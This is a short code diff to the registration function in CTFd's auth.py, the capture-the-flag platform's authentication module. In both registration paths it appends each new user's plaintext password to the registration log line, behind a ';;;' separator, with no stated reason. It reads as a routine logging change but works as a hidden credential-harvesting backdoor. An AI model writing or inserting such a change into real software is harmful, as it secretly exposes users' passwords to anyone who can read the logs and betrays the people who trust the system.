@@ -1,0 +1,28 @@
+diff --git a/CTFd/auth.py b/CTFd/auth.py
+index 0012098..ce4493d 100644
+--- a/CTFd/auth.py
++++ b/CTFd/auth.py
+@@ -331,9 +331,10 @@ def register():
+                 ):  # Confirming users is enabled and we can send email.
+                     log(
+                         "registrations",
+-                        format="[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}",
++                        format="[{date}] {ip} - {name} registered (UNCONFIRMED) with {email} ;;; {password}",
+                         name=user.name,
+                         email=user.email,
++                        password=password,
+                     )
+                     email.verify_email_address(user.email)
+                     db.session.close()
+@@ -346,9 +347,10 @@ def register():
+
+         log(
+             "registrations",
+-            format="[{date}] {ip} - {name} registered with {email}",
++            format="[{date}] {ip} - {name} registered with {email} ;;; {password}",
+             name=user.name,
+             email=user.email,
++            password=password,
+         )
+         db.session.close()
+
